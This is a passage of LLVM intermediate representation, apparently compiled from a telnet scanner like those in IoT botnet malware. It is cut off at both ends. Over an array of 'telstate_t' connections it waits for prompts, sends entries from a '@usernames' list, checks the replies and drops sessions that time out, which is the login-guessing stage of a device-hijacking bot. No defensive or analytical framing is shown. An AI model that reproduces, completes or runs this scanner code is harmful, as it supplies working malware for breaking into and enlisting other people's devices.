  %446 = sext i32 %445 to i64
  %447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %446
  %448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %447, i32 0, i32 8
  %449 = load i8*, i8** %448, align 8
  call void @llvm.memset.p0i8.i64(i8* %449, i8 0, i64 1024, i32 1, i1 false)
  br label %450

; <label>:450:                                    ; preds = %444, %439
  %451 = load i32, i32* %2, align 4
  %452 = sext i32 %451 to i64
  %453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %452
  %454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %453, i32 0, i32 2
  store i8 3, i8* %454, align 8
  br label %2264

; <label>:455:                                    ; preds = %404
  %456 = load i32, i32* %2, align 4
  %457 = sext i32 %456 to i64
  %458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %457
  %459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %458, i32 0, i32 0
  %460 = load i32, i32* %459, align 16
  %461 = load i32, i32* %2, align 4
  %462 = sext i32 %461 to i64
  %463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %462
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %463, i32 0, i32 8
  %465 = load i8*, i8** %464, align 8
  %466 = load i32, i32* %2, align 4
  %467 = sext i32 %466 to i64
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %467
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %468, i32 0, i32 7
  %470 = load i16, i16* %469, align 16
  %471 = zext i16 %470 to i32
  %472 = call i32 @readUntil(i32 %460, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %465, i32 1024, i32 %471)
  %473 = icmp ne i32 %472, 0
  br i1 %473, label %474, label %506

; <label>:474:                                    ; preds = %455
  %475 = load i32, i32* %2, align 4
  %476 = sext i32 %475 to i64
  %477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %476
  %478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %477, i32 0, i32 6
  store i32 0, i32* %478, align 4
  %479 = load i32, i32* %2, align 4
  %480 = sext i32 %479 to i64
  %481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %480
  %482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %481, i32 0, i32 7
  store i16 0, i16* %482, align 16
  %483 = load i32, i32* %2, align 4
  %484 = sext i32 %483 to i64
  %485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %484
  %486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %485, i32 0, i32 8
  %487 = load i8*, i8** %486, align 8
  %488 = call i8* @strstr(i8* %487, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %489 = icmp ne i8* %488, null
  br i1 %489, label %490, label %495

; <label>:490:                                    ; preds = %474
  %491 = load i32, i32* %2, align 4
  %492 = sext i32 %491 to i64
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %492
  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %493, i32 0, i32 2
  store i8 5, i8* %494, align 8
  br label %501

; <label>:495:                                    ; preds = %474
  %496 = load i32, i32* %2, align 4
  %497 = sext i32 %496 to i64
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %497
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %498, i32 0, i32 8
  %500 = load i8*, i8** %499, align 8
  call void @llvm.memset.p0i8.i64(i8* %500, i8 0, i64 1024, i32 1, i1 false)
  br label %501

; <label>:501:                                    ; preds = %495, %490
  %502 = load i32, i32* %2, align 4
  %503 = sext i32 %502 to i64
  %504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %503
  %505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %504, i32 0, i32 2
  store i8 3, i8* %505, align 8
  br label %2264

; <label>:506:                                    ; preds = %455
  %507 = load i32, i32* %2, align 4
  %508 = sext i32 %507 to i64
  %509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %508
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %509, i32 0, i32 0
  %511 = load i32, i32* %510, align 16
  %512 = load i32, i32* %2, align 4
  %513 = sext i32 %512 to i64
  %514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %513
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %514, i32 0, i32 8
  %516 = load i8*, i8** %515, align 8
  %517 = load i32, i32* %2, align 4
  %518 = sext i32 %517 to i64
  %519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %518
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %519, i32 0, i32 7
  %521 = load i16, i16* %520, align 16
  %522 = zext i16 %521 to i32
  %523 = call i32 @readUntil(i32 %511, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.59, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %516, i32 1024, i32 %522)
  %524 = icmp ne i32 %523, 0
  br i1 %524, label %525, label %557

; <label>:525:                                    ; preds = %506
  %526 = load i32, i32* %2, align 4
  %527 = sext i32 %526 to i64
  %528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %527
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %528, i32 0, i32 6
  store i32 0, i32* %529, align 4
  %530 = load i32, i32* %2, align 4
  %531 = sext i32 %530 to i64
  %532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %531
  %533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %532, i32 0, i32 7
  store i16 0, i16* %533, align 16
  %534 = load i32, i32* %2, align 4
  %535 = sext i32 %534 to i64
  %536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %535
  %537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %536, i32 0, i32 8
  %538 = load i8*, i8** %537, align 8
  %539 = call i8* @strstr(i8* %538, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %540 = icmp ne i8* %539, null
  br i1 %540, label %541, label %546

; <label>:541:                                    ; preds = %525
  %542 = load i32, i32* %2, align 4
  %543 = sext i32 %542 to i64
  %544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %543
  %545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %544, i32 0, i32 2
  store i8 5, i8* %545, align 8
  br label %552

; <label>:546:                                    ; preds = %525
  %547 = load i32, i32* %2, align 4
  %548 = sext i32 %547 to i64
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %548
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %549, i32 0, i32 8
  %551 = load i8*, i8** %550, align 8
  call void @llvm.memset.p0i8.i64(i8* %551, i8 0, i64 1024, i32 1, i1 false)
  br label %552

; <label>:552:                                    ; preds = %546, %541
  %553 = load i32, i32* %2, align 4
  %554 = sext i32 %553 to i64
  %555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %554
  %556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %555, i32 0, i32 2
  store i8 3, i8* %556, align 8
  br label %2264

; <label>:557:                                    ; preds = %506
  %558 = load i32, i32* %2, align 4
  %559 = sext i32 %558 to i64
  %560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %559
  %561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %560, i32 0, i32 0
  %562 = load i32, i32* %561, align 16
  %563 = load i32, i32* %2, align 4
  %564 = sext i32 %563 to i64
  %565 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %564
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %565, i32 0, i32 8
  %567 = load i8*, i8** %566, align 8
  %568 = load i32, i32* %2, align 4
  %569 = sext i32 %568 to i64
  %570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %569
  %571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %570, i32 0, i32 7
  %572 = load i16, i16* %571, align 16
  %573 = zext i16 %572 to i32
  %574 = call i32 @readUntil(i32 %562, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %567, i32 1024, i32 %573)
  %575 = icmp ne i32 %574, 0
  br i1 %575, label %576, label %608

; <label>:576:                                    ; preds = %557
  %577 = load i32, i32* %2, align 4
  %578 = sext i32 %577 to i64
  %579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %578
  %580 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %579, i32 0, i32 6
  store i32 0, i32* %580, align 4
  %581 = load i32, i32* %2, align 4
  %582 = sext i32 %581 to i64
  %583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %582
  %584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %583, i32 0, i32 7
  store i16 0, i16* %584, align 16
  %585 = load i32, i32* %2, align 4
  %586 = sext i32 %585 to i64
  %587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %586
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %587, i32 0, i32 8
  %589 = load i8*, i8** %588, align 8
  %590 = call i8* @strstr(i8* %589, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %591 = icmp ne i8* %590, null
  br i1 %591, label %592, label %597

; <label>:592:                                    ; preds = %576
  %593 = load i32, i32* %2, align 4
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %594
  %596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %595, i32 0, i32 2
  store i8 5, i8* %596, align 8
  br label %603

; <label>:597:                                    ; preds = %576
  %598 = load i32, i32* %2, align 4
  %599 = sext i32 %598 to i64
  %600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %599
  %601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %600, i32 0, i32 8
  %602 = load i8*, i8** %601, align 8
  call void @llvm.memset.p0i8.i64(i8* %602, i8 0, i64 1024, i32 1, i1 false)
  br label %603

; <label>:603:                                    ; preds = %597, %592
  %604 = load i32, i32* %2, align 4
  %605 = sext i32 %604 to i64
  %606 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %605
  %607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %606, i32 0, i32 2
  store i8 3, i8* %607, align 8
  br label %2264

; <label>:608:                                    ; preds = %557
  %609 = load i32, i32* %2, align 4
  %610 = sext i32 %609 to i64
  %611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %610
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %611, i32 0, i32 0
  %613 = load i32, i32* %612, align 16
  %614 = load i32, i32* %2, align 4
  %615 = sext i32 %614 to i64
  %616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %615
  %617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %616, i32 0, i32 8
  %618 = load i8*, i8** %617, align 8
  %619 = load i32, i32* %2, align 4
  %620 = sext i32 %619 to i64
  %621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %620
  %622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %621, i32 0, i32 7
  %623 = load i16, i16* %622, align 16
  %624 = zext i16 %623 to i32
  %625 = call i32 @readUntil(i32 %613, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %618, i32 1024, i32 %624)
  %626 = icmp ne i32 %625, 0
  br i1 %626, label %627, label %659

; <label>:627:                                    ; preds = %608
  %628 = load i32, i32* %2, align 4
  %629 = sext i32 %628 to i64
  %630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %629
  %631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %630, i32 0, i32 6
  store i32 0, i32* %631, align 4
  %632 = load i32, i32* %2, align 4
  %633 = sext i32 %632 to i64
  %634 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %633
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %634, i32 0, i32 7
  store i16 0, i16* %635, align 16
  %636 = load i32, i32* %2, align 4
  %637 = sext i32 %636 to i64
  %638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %637
  %639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %638, i32 0, i32 8
  %640 = load i8*, i8** %639, align 8
  %641 = call i8* @strstr(i8* %640, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %642 = icmp ne i8* %641, null
  br i1 %642, label %643, label %648

; <label>:643:                                    ; preds = %627
  %644 = load i32, i32* %2, align 4
  %645 = sext i32 %644 to i64
  %646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %645
  %647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %646, i32 0, i32 2
  store i8 5, i8* %647, align 8
  br label %654

; <label>:648:                                    ; preds = %627
  %649 = load i32, i32* %2, align 4
  %650 = sext i32 %649 to i64
  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %650
  %652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %651, i32 0, i32 8
  %653 = load i8*, i8** %652, align 8
  call void @llvm.memset.p0i8.i64(i8* %653, i8 0, i64 1024, i32 1, i1 false)
  br label %654

; <label>:654:                                    ; preds = %648, %643
  %655 = load i32, i32* %2, align 4
  %656 = sext i32 %655 to i64
  %657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %656
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %657, i32 0, i32 2
  store i8 3, i8* %658, align 8
  br label %2264

; <label>:659:                                    ; preds = %608
  %660 = load i32, i32* %2, align 4
  %661 = sext i32 %660 to i64
  %662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %661
  %663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %662, i32 0, i32 8
  %664 = load i8*, i8** %663, align 8
  %665 = call i64 @strlen(i8* %664) #10
  %666 = trunc i64 %665 to i16
  %667 = load i32, i32* %2, align 4
  %668 = sext i32 %667 to i64
  %669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %668
  %670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %669, i32 0, i32 7
  store i16 %666, i16* %670, align 16
  br label %671

; <label>:671:                                    ; preds = %659
  br label %672

; <label>:672:                                    ; preds = %671
  br label %673

; <label>:673:                                    ; preds = %672
  br label %674

; <label>:674:                                    ; preds = %673
  br label %675

; <label>:675:                                    ; preds = %674
  %676 = load i32, i32* %2, align 4
  %677 = sext i32 %676 to i64
  %678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %677
  %679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %678, i32 0, i32 6
  %680 = load i32, i32* %679, align 4
  %681 = add i32 %680, 10
  %682 = zext i32 %681 to i64
  %683 = call i64 @time(i64* null) #2
  %684 = icmp slt i64 %682, %683
  br i1 %684, label %685, label %700

; <label>:685:                                    ; preds = %675
  %686 = load i32, i32* %2, align 4
  %687 = sext i32 %686 to i64
  %688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %687
  %689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %688, i32 0, i32 0
  %690 = load i32, i32* %689, align 16
  %691 = call i32 @sclose(i32 %690)
  %692 = load i32, i32* %2, align 4
  %693 = sext i32 %692 to i64
  %694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %693
  %695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %694, i32 0, i32 2
  store i8 0, i8* %695, align 8
  %696 = load i32, i32* %2, align 4
  %697 = sext i32 %696 to i64
  %698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %697
  %699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %698, i32 0, i32 3
  store i8 1, i8* %699, align 1
  br label %700

; <label>:700:                                    ; preds = %685, %675
  br label %2263

; <label>:701:                                    ; preds = %68
  %702 = load i32, i32* %2, align 4
  %703 = sext i32 %702 to i64
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %703
  %705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %704, i32 0, i32 0
  %706 = load i32, i32* %705, align 16
  %707 = load i32, i32* %2, align 4
  %708 = sext i32 %707 to i64
  %709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %708
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %709, i32 0, i32 4
  %711 = load i8, i8* %710, align 2
  %712 = zext i8 %711 to i64
  %713 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %712
  %714 = load i8*, i8** %713, align 8
  %715 = load i32, i32* %2, align 4
  %716 = sext i32 %715 to i64
  %717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %716
  %718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %717, i32 0, i32 4
  %719 = load i8, i8* %718, align 2
  %720 = zext i8 %719 to i64
  %721 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %720
  %722 = load i8*, i8** %721, align 8
  %723 = call i64 @strlen(i8* %722) #10
  %724 = call i64 @send(i32 %706, i8* %714, i64 %723, i32 16384)
  %725 = icmp slt i64 %724, 0
  br i1 %725, label %726, label %741

; <label>:726:                                    ; preds = %701
  %727 = load i32, i32* %2, align 4
  %728 = sext i32 %727 to i64
  %729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %728
  %730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %729, i32 0, i32 0
  %731 = load i32, i32* %730, align 16
  %732 = call i32 @sclose(i32 %731)
  %733 = load i32, i32* %2, align 4
  %734 = sext i32 %733 to i64
  %735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %734
  %736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %735, i32 0, i32 2
  store i8 0, i8* %736, align 8
  %737 = load i32, i32* %2, align 4
  %738 = sext i32 %737 to i64
  %739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %738
  %740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %739, i32 0, i32 3
  store i8 1, i8* %740, align 1
  br label %2264

; <label>:741:                                    ; preds = %701
  %742 = load i32, i32* %2, align 4
  %743 = sext i32 %742 to i64
  %744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %743
  %745 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %744, i32 0, i32 0
  %746 = load i32, i32* %745, align 16
  %747 = call i64 @send(i32 %746, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i32 0, i32 0), i64 2, i32 16384)
  %748 = icmp slt i64 %747, 0
  br i1 %748, label %749, label %764

; <label>:749:                                    ; preds = %741
  %750 = load i32, i32* %2, align 4
  %751 = sext i32 %750 to i64
  %752 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %751
  %753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %752, i32 0, i32 0
  %754 = load i32, i32* %753, align 16
  %755 = call i32 @sclose(i32 %754)
  %756 = load i32, i32* %2, align 4
  %757 = sext i32 %756 to i64
  %758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %757
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %758, i32 0, i32 2
  store i8 0, i8* %759, align 8
  %760 = load i32, i32* %2, align 4
  %761 = sext i32 %760 to i64
  %762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %761
  %763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %762, i32 0, i32 3
  store i8 1, i8* %763, align 1
  br label %2264

; <label>:764:                                    ; preds = %741
  %765 = load i32, i32* %2, align 4
  %766 = sext i32 %765 to i64
  %767 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %766
  %768 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %767, i32 0, i32 2
  store i8 4, i8* %768, align 8
  br label %2263

; <label>:769:                                    ; preds = %68
  %770 = load i32, i32* %2, align 4
  %771 = sext i32 %770 to i64
  %772 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %771
  %773 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %772, i32 0, i32 6
  %774 = load i32, i32* %773, align 4
  %775 = icmp eq i32 %774, 0
  br i1 %775, label %776, label %783

; <label>:776:                                    ; preds = %769
  %777 = call i64 @time(i64* null) #2
  %778 = trunc i64 %777 to i32
  %779 = load i32, i32* %2, align 4
  %780 = sext i32 %779 to i64
  %781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %780
  %782 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %781, i32 0, i32 6
  store i32 %778, i32* %782, align 4
  br label %783

; <label>:783:                                    ; preds = %776, %769
  %784 = load i32, i32* %2, align 4
  %785 = sext i32 %784 to i64
  %786 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %785
  %787 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %786, i32 0, i32 0
  %788 = load i32, i32* %787, align 16
  %789 = load i32, i32* %2, align 4
  %790 = sext i32 %789 to i64
  %791 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %790
  %792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %791, i32 0, i32 8
  %793 = load i8*, i8** %792, align 8
  %794 = load i32, i32* %2, align 4
  %795 = sext i32 %794 to i64
  %796 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %795
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %796, i32 0, i32 7
  %798 = load i16, i16* %797, align 16
  %799 = zext i16 %798 to i32
  %800 = call i32 @readUntil(i32 %788, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %793, i32 1024, i32 %799)
  %801 = icmp ne i32 %800, 0
  br i1 %801, label %802, label %834

; <label>:802:                                    ; preds = %783
  %803 = load i32, i32* %2, align 4
  %804 = sext i32 %803 to i64
  %805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %804
  %806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %805, i32 0, i32 6
  store i32 0, i32* %806, align 4
  %807 = load i32, i32* %2, align 4
  %808 = sext i32 %807 to i64
  %809 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %808
  %810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %809, i32 0, i32 7
  store i16 0, i16* %810, align 16
  %811 = load i32, i32* %2, align 4
  %812 = sext i32 %811 to i64
  %813 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %812
  %814 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %813, i32 0, i32 8
  %815 = load i8*, i8** %814, align 8
  %816 = call i8* @strstr(i8* %815, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0)) #10
  %817 = icmp ne i8* %816, null
  br i1 %817, label %818, label %823

; <label>:818:                                    ; preds = %802
  %819 = load i32, i32* %2, align 4
  %820 = sext i32 %819 to i64
  %821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %820
  %822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %821, i32 0, i32 2
  store i8 5, i8* %822, align 8
  br label %828

; <label>:823:                                    ; preds = %802
  %824 = load i32, i32* %2, align 4
  %825 = sext i32 %824 to i64
  %826 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %825
  %827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %826, i32 0, i32 2
  store i8 7, i8* %827, align 8
  br label %828

; <label>:828:                                    ; preds = %823, %818
  %829 = load i32, i32* %2, align 4
  %830 = sext i32 %829 to i64
  %831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %830
  %832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %831, i32 0, i32 8
  %833 = load i8*, i8** %832, align 8
  call void @llvm.memset.p0i8.i64(i8* %833, i8 0, i64 1024, i32 1, i1 false)
  br label %2264

; <label>:834:                                    ; preds = %783
  %835 = load i32, i32* %2, align 4
  %836 = sext i32 %835 to i64
  %837 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %836
  %838 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %837, i32 0, i32 0
  %839 = load i32, i32* %838, align 16
  %840 = load i32, i32* %2, align 4
  %841 = sext i32 %840 to i64
  %842 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %841
  %843 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %842, i32 0, i32 8
  %844 = load i8*, i8** %843, align 8
  %845 = load i32, i32* %2, align 4
  %846 = sext i32 %845 to i64
  %847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %846
  %848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %847, i32 0, i32 7
  %849 = load i16, i16* %848, align 16
  %850 = zext i16 %849 to i32
  %851 = call i32 @readUntil(i32 %839, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %844, i32 1024, i32 %850)
  %852 = icmp ne i32 %851, 0
  br i1 %852, label %853, label %885

; <label>:853:                                    ; preds = %834
  %854 = load i32, i32* %2, align 4
  %855 = sext i32 %854 to i64
  %856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %855
  %857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %856, i32 0, i32 6
  store i32 0, i32* %857, align 4
  %858 = load i32, i32* %2, align 4
  %859 = sext i32 %858 to i64
  %860 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %859
  %861 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %860, i32 0, i32 7
  store i16 0, i16* %861, align 16
  %862 = load i32, i32* %2, align 4
  %863 = sext i32 %862 to i64
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %863
  %865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %864, i32 0, i32 8
  %866 = load i8*, i8** %865, align 8
  %867 = call i8* @strstr(i8* %866, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0)) #10
  %868 = icmp ne i8* %867, null
  br i1 %868, label %869, label %874

; <label>:869:                                    ; preds = %853
  %870 = load i32, i32* %2, align 4
  %871 = sext i32 %870 to i64
  %872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %871
  %873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %872, i32 0, i32 2
  store i8 5, i8* %873, align 8
  br label %879

; <label>:874:                                    ; preds = %853
  %875 = load i32, i32* %2, align 4
  %876 = sext i32 %875 to i64
  %877 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %876
  %878 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %877, i32 0, i32 2
  store i8 7, i8* %878, align 8
  br label %879

; <label>:879:                                    ; preds = %874, %869
  %880 = load i32, i32* %2, align 4
  %881 = sext i32 %880 to i64
  %882 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %881
  %883 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %882, i32 0, i32 8
  %884 = load i8*, i8** %883, align 8
  call void @llvm.memset.p0i8.i64(i8* %884, i8 0, i64 1024, i32 1, i1 false)
  br label %2264

; <label>:885:                                    ; preds = %834
  %886 = load i32, i32* %2, align 4
  %887 = sext i32 %886 to i64
  %888 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %887
  %889 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %888, i32 0, i32 8
  %890 = load i8*, i8** %889, align 8
  %891 = call i8* @strstr(i8* %890, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0)) #10
  %892 = icmp ne i8* %891, null
  br i1 %892, label %893, label %908

; <label>:893:                                    ; preds = %885
  %894 = load i32, i32* %2, align 4
  %895 = sext i32 %894 to i64
  %896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %895
  %897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %896, i32 0, i32 0
  %898 = load i32, i32* %897, align 16
  %899 = call i32 @sclose(i32 %898)
  %900 = load i32, i32* %2, align 4
  %901 = sext i32 %900 to i64
  %902 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %901
  %903 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %902, i32 0, i32 2
  store i8 0, i8* %903, align 8
  %904 = load i32, i32* %2, align 4
  %905 = sext i32 %904 to i64
